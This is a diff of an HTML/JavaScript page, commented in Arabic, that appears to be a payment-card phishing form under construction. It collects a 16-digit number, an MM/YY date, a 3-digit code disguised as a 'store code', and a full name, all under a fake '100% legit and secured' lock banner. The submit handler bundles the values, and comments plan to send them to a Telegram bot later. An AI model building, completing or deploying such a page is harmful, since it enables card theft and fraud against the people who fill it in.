@@ -5,47 +5,62 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Confirm Details</title>
   <style>
+    :root {
+      --bg-page: #f5f5f7;
+      --border-outer: #e0e0e0;
+      --border-inner: #e5e5e5;
+      --text-main: #222;
+      --text-muted: #777;
+      --accent-blue: #0084ff;
+      --accent-blue-hover: #0073dd;
+      --accent-green: #16a34a;
+    }
+
     * {
       box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
     }
 
     body {
-      background-color: #f5f5f5;
+      margin: 0;
+      padding: 24px 12px;
       min-height: 100vh;
+      background-color: var(--bg-page);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui,
+        sans-serif;
       display: flex;
-      justify-content: center;   /* وسط أفقياً */
-      align-items: center;       /* وسط عمودياً */
-      padding: 20px 10px;
+      justify-content: center;
+      align-items: center;
     }
 
-    /* الإطار الخارجي */
+    .page-wrapper {
+      width: 100%;
+      max-width: 420px;
+    }
+
     .outer-card {
       background-color: #ffffff;
-      border: 1px solid #dddddd;
-      border-radius: 8px;
-      padding: 20px 20px 30px;
-      max-width: 420px;
-      width: 100%;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.06);
+      border-radius: 10px;
+      border: 1px solid var(--border-outer);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+      padding: 18px 16px 22px;
     }
 
-    /* سطر القفل + النص */
-    .security-row {
+    .secure-banner {
       display: flex;
       align-items: center;
-      margin-bottom: 18px;
       gap: 10px;
+      margin-bottom: 14px;
+      color: var(--text-main);
+      font-size: 14px;
+      line-height: 1.4;
     }
 
-    /* قفل أخضر مبني بـ CSS (شكله أنظف من الإيموجي) */
+    /* أيقونة القفل – نظيفة وقريبة من اللي بالصورة */
     .lock-icon {
-      width: 24px;
-      height: 24px;
+      width: 22px;
+      height: 22px;
       border-radius: 4px;
-      border: 2px solid #16a34a;
+      border: 2px solid var(--accent-green);
       position: relative;
       background-color: #ffffff;
       flex-shrink: 0;
@@ -57,8 +72,8 @@
       left: 50%;
       top: 3px;
       width: 12px;
-      height: 8px;
-      border: 2px solid #16a34a;
+      height: 7px;
+      border: 2px solid var(--accent-green);
       border-bottom: none;
       border-radius: 999px 999px 0 0;
       transform: translateX(-50%);
@@ -72,220 +87,241 @@
       bottom: 3px;
       width: 12px;
       height: 9px;
-      background-color: #16a34a;
+      background-color: var(--accent-green);
       border-radius: 2px;
       transform: translateX(-50%);
     }
 
-    .security-text {
-      font-size: 13px;
-      color: #444;
-      line-height: 1.4;
-    }
-
-    /* الإطار الداخلي للنموذج */
-    .inner-card {
-      border: 1px solid #e0e0e0;
-      border-radius: 8px;
-      padding: 20px 18px 24px;
+    .form-card {
       background-color: #fafafa;
+      border-radius: 10px;
+      border: 1px solid var(--border-inner);
+      padding: 24px 20px 26px;
     }
 
     .form-title {
       text-align: center;
-      font-size: 18px;
+      font-size: 20px;
       font-weight: 600;
-      margin-bottom: 18px;
+      margin: 0 0 20px;
+      color: var(--text-main);
     }
 
-    .field-group {
+    form {
+      margin: 0;
+    }
+
+    .field {
       margin-bottom: 14px;
     }
 
-    .field-label {
-      font-size: 13px;
-      margin-bottom: 4px;
-      color: #444;
+    label {
+      display: block;
+      font-size: 14px;
+      color: var(--text-main);
+      margin-bottom: 6px;
     }
 
-    .form-row {
+    input[type="text"],
+    input[type="tel"] {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border-radius: 4px;
+      border: 1px solid #d0d0d0;
+      font-size: 15px;
+      outline: none;
+      background-color: #ffffff;
+      transition: border-color 0.15s ease, box-shadow 0.15s ease;
+    }
+
+    input::placeholder {
+      color: #b9b9b9;
+    }
+
+    input:focus {
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 0 2px rgba(0, 132, 255, 0.15);
+    }
+
+    .row {
       display: flex;
       gap: 10px;
     }
 
-    input[type="text"] {
-      width: 100%;
-      padding: 9px 11px;
-      border-radius: 4px;
-      border: 1px solid #d0d0d0;
-      font-size: 14px;
-      outline: none;
-      transition: border-color 0.15s ease, box-shadow 0.15s ease;
-      background-color: #ffffff;
+    .row .field {
+      flex: 1;
+      margin-bottom: 0;
     }
 
-    input[type="text"]::placeholder {
-      color: #b5b5b5;
+    .field-code {
+      max-width: 130px;
+      flex: 0 0 130px;
     }
 
-    input[type="text"]:focus {
-      border-color: #1a73e8;
-      box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
-    }
-
-    .hint {
-      margin-top: 3px;
+    .helper {
       font-size: 11px;
-      color: #888;
+      color: var(--text-muted);
+      margin-top: 4px;
     }
 
-    .btn-confirm {
+    .btn-wrapper {
+      margin-top: 16px;
+    }
+
+    button {
       width: 100%;
-      margin-top: 10px;
-      padding: 10px 0;
-      background-color: #0088d8;
-      color: #ffffff;
-      border: none;
+      height: 46px;
       border-radius: 4px;
-      font-size: 15px;
+      border: none;
+      background-color: var(--accent-blue);
+      color: #ffffff;
+      font-size: 16px;
       font-weight: 500;
       cursor: pointer;
-      transition: background-color 0.15s ease, box-shadow 0.15s ease;
+      transition: background-color 0.15s ease, transform 0.05s ease;
     }
 
-    .btn-confirm:hover {
-      background-color: #0071b3;
-      box-shadow: 0 1px 3px rgba(0,0,0,0.15);
+    button:active {
+      transform: translateY(1px);
+    }
+
+    button:hover {
+      background-color: var(--accent-blue-hover);
     }
 
     @media (max-width: 480px) {
       body {
-        padding: 20px 8px;
+        padding: 18px 10px;
       }
 
       .outer-card {
-        padding: 16px 14px 24px;
+        padding: 14px 12px 20px;
       }
 
-      .inner-card {
-        padding: 16px 12px 20px;
+      .form-card {
+        padding: 20px 16px 24px;
       }
     }
   </style>
 </head>
 <body>
-
-  <div class="outer-card">
-    <!-- القفل + النص -->
-    <div class="security-row">
-      <div class="lock-icon"></div>
-      <div class="security-text">
-        All usernames are 100% legit and secured
+  <div class="page-wrapper">
+    <div class="outer-card">
+      <div class="secure-banner">
+        <div class="lock-icon"></div>
+        <span>All usernames are 100% legit and secured</span>
       </div>
-    </div>
 
-    <!-- البوكس الداخلي -->
-    <div class="inner-card">
-      <h2 class="form-title">Confirm Details</h2>
+      <div class="form-card">
+        <h1 class="form-title">Confirm Details</h1>
 
-      <form id="usernameForm">
-        <!-- Number -->
-        <div class="field-group">
-          <div class="field-label">Number</div>
-          <input
-            type="text"
-            id="number"
-            name="number"
-            placeholder="XXXX XXXX XXXX XXXX"
-            maxlength="19"
-            autocomplete="off"
-            inputmode="numeric"
-          />
-        </div>
-
-        <!-- Date + كود متجرنا -->
-        <div class="form-row">
-          <div class="field-group" style="flex: 1;">
-            <div class="field-label">Date</div>
+        <form id="confirmForm">
+          <!-- رقم (16 رقم – يظهر بشكل XXXX XXXX XXXX XXXX) -->
+          <div class="field">
+            <label for="number">Number</label>
             <input
+              id="number"
               type="text"
-              id="date"
-              name="date"
-              placeholder="MM/YY"
-              maxlength="5"
-              autocomplete="off"
               inputmode="numeric"
+              autocomplete="off"
+              placeholder="XXXX XXXX XXXX XXXX"
+              maxlength="19"
+              required
             />
           </div>
-          <div class="field-group" style="flex: 1;">
-            <div class="field-label">كود متجرنا</div>
-            <input
-              type="text"
-              id="storeCode"
-              name="storeCode"
-              placeholder="000"
-              maxlength="3"
-              autocomplete="off"
-              inputmode="numeric"
-            />
+
+          <!-- صف: التاريخ + كود متجرنا -->
+          <div class="row" style="margin-bottom: 14px;">
+            <div class="field">
+              <label for="expiry">Date</label>
+              <input
+                id="expiry"
+                type="text"
+                inputmode="numeric"
+                autocomplete="off"
+                placeholder="MM/YY"
+                maxlength="5"
+                required
+              />
+            </div>
+
+            <div class="field field-code">
+              <label for="storeCode">كود متجرنا</label>
+              <input
+                id="storeCode"
+                type="text"
+                inputmode="numeric"
+                autocomplete="off"
+                placeholder="000"
+                maxlength="3"
+                required
+              />
+            </div>
           </div>
-        </div>
 
-        <!-- Name -->
-        <div class="field-group">
-          <div class="field-label">Name</div>
-          <input
-            type="text"
-            id="fullName"
-            name="fullName"
-            autocomplete="off"
-          />
-          <div class="hint">* Full Name</div>
-        </div>
+          <!-- الاسم -->
+          <div class="field">
+            <label for="fullName">Name</label>
+            <input
+              id="fullName"
+              type="text"
+              autocomplete="off"
+              placeholder=""
+              required
+            />
+            <div class="helper">* Full Name</div>
+          </div>
 
-        <button type="submit" class="btn-confirm">Confirm</button>
-      </form>
+          <div class="btn-wrapper">
+            <button type="submit">Confirm</button>
+          </div>
+        </form>
+      </div>
     </div>
   </div>
 
   <script>
-    // Number: أرقام فقط + تنسيق 4-4-4-4
+    // تنسيق رقم الـ Number (16 رقم، يتقسم 4-4-4-4)
     const numberInput = document.getElementById("number");
     numberInput.addEventListener("input", (e) => {
       let digits = e.target.value.replace(/\D/g, "").slice(0, 16);
-      let parts = [];
-      for (let i = 0; i < digits.length; i += 4) {
-        parts.push(digits.substring(i, i + 4));
-      }
-      e.target.value = parts.join(" ");
+      let formatted = digits.replace(/(.{4})/g, "$1 ").trim();
+      e.target.value = formatted;
     });
 
-    // Date: MM/YY مع / تلقائية
-    const dateInput = document.getElementById("date");
-    dateInput.addEventListener("input", (e) => {
+    // تنسيق التاريخ MM/YY مع / تلقائياً
+    const expiryInput = document.getElementById("expiry");
+    expiryInput.addEventListener("input", (e) => {
       let digits = e.target.value.replace(/\D/g, "").slice(0, 4);
       if (digits.length >= 3) {
-        e.target.value = digits.slice(0, 2) + "/" + digits.slice(2);
-      } else {
-        e.target.value = digits;
+        digits = digits.slice(0, 2) + "/" + digits.slice(2);
       }
+      e.target.value = digits;
     });
 
-    // كود المتجر: 3 أرقام فقط
+    // حصر كود المتجر على أرقام فقط
     const storeCodeInput = document.getElementById("storeCode");
     storeCodeInput.addEventListener("input", (e) => {
-      e.target.value = e.target.value.replace(/\D/g, "").slice(0, 3);
+      let digits = e.target.value.replace(/\D/g, "").slice(0, 3);
+      e.target.value = digits;
     });
 
-    // منع الإرسال الحقيقي حالياً
-    document
-      .getElementById("usernameForm")
-      .addEventListener("submit", (e) => {
-        e.preventDefault();
-        // هنا لاحقاً تربط تيليجرام أو أي باك إند
-        console.log("Form captured");
-      });
-  </script>
+    // حالياً نمنع الريلود فقط – الربط مع تيليجرام أو غيره نضيفه لاحقاً
+    const form = document.getElementById("confirmForm");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
 
+      const payload = {
+        number: numberInput.value.trim(),
+        expiry: expiryInput.value.trim(),
+        storeCode: storeCodeInput.value.trim(),
+        fullName: document.getElementById("fullName").value.trim(),
+      };
+
+      console.log("Form data ready to send:", payload);
+      // هنا لاحقاً نضيف request إلى API (بوت تيليجرام أو غيره)
+    });
+  </script>
 </body>
 </html>
